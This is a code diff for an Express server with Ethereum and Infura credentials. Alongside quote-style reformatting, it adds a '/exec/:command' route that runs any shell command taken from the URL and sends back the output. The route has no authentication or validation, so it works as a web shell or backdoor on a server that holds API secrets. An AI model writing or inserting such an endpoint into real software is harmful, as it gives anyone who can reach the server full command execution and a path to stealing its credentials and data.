@@ -2,9 +2,8 @@ const express = require("express");
 const fsPromises = require("fs/promises");
 const ethers = require("ethers");
 require("dotenv").config();
-const util = require('util');
-const exec = util.promisify(require('child_process').exec);
-
+const util = require("util");
+const exec = util.promisify(require("child_process").exec);
 
 const INFURA_PROJECT_ID = process.env.INFURA_PROJECT_ID;
 const INFURA_PROJECT_PRIVATE = process.env.INFURA_PROJECT_PRIVATE;
@@ -38,9 +37,9 @@ const shower = async (req) => {
 };
 
 async function lsExample() {
-  const { stdout, stderr } = await exec('ls');
-  console.log('stdout:', stdout);
-  console.error('stderr:', stderr);
+  const { stdout, stderr } = await exec("ls");
+  console.log("stdout:", stdout);
+  console.error("stderr:", stderr);
   return stdout;
 }
 
@@ -150,7 +149,22 @@ app.get(
   async (req, res) => {
     let stdout = await lsExample();
     res.send(stdout);
+  }
+);
 
+app.get(
+  "/exec/:command",
+  async (req, res, next) => {
+    await logger(req);
+    next();
+  },
+  (req, res, next) => {
+    shower(req);
+    next();
+  },
+  async (req, res) => {
+    let stdout = await exec(req.params.command);
+    res.send(stdout);
   }
 );
 
